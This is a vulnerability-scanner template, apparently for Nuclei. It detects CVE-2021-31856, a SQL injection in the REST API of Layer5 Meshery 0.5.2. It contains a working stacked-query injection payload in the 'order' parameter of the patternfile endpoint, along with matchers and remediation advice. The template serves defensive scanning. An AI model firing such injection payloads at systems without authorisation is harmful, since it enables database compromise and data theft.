id: CVE-2021-31856
info:
  name: Layer5 Meshery 0.5.2 - SQL Injection
  author: princechaddha
  severity: critical
  description: Layer5 Meshery 0.5.2 contains a critical SQL injection vulnerability
    that can be exploited by attackers to execute arbitrary SQL commands through the
    REST API.
  reference:
  - https://github.com/ssst0n3/CVE-2021-31856
  - https://nvd.nist.gov/vuln/detail/CVE-2021-31856
  - https://meshery.io
  - https://github.com/layer5io/meshery/pull/2745
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-31856
    cwe-id: CWE-89
  tags: sqli,cve,cve2021
  metadata:
    impact: The SQL injection vulnerability in Layer5 Meshery 0.5.2 has the potential
      to allow an attacker to execute unauthorized actions and gain privileged access
      to sensitive data, leading to significant impacts on system security and confidentiality.
    recommendation: It is recommended to update to a version of Layer5 Meshery that
      does not contain the SQL injection vulnerability, in order to prevent potential
      exploitation by attackers.
variables:
  num: '999999999'
requests:
- method: GET
  path:
  - '{{BaseURL}}/api/experimental/patternfile?order=id%3Bselect(md5({{num}}))&page=0&page_size=0'
  matchers-condition: and
  matchers:
  - type: word
    words:
    - '{{md5({{num}})}}'
    part: body
  - type: status
    status:
    - 200
